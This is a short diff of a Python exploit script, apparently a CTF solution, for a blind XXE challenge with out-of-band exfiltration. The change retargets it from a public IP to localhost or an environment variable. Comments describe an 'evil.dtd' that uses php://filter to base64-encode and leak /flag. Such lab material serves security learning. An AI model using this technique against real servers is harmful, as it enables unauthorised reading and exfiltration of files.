@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 import atexit
+import os
 atexit.register(lambda: print("作者 ZluxYao"))
 """
 28-xxe-blind-oob 一键 EXP
-目标: http://47.120.76.57:34936
+目标: http://127.0.0.1:34936
 Flag 格式: TOGOGO-flag{...}
 
 思路（盲 XXE + OOB 全闭环）:
@@ -18,7 +19,7 @@ import sys
 import base64
 import requests
 
-TARGET = "http://47.120.76.57:34936"
+TARGET = os.environ.get("GKD_URL") or ("http://127.0.0.1:34936")
 
 # evil.dtd —— 参数实体三段套
 #   %f   :  php://filter 把 /flag base64 编码（避免特殊字符破坏 URL/XML）
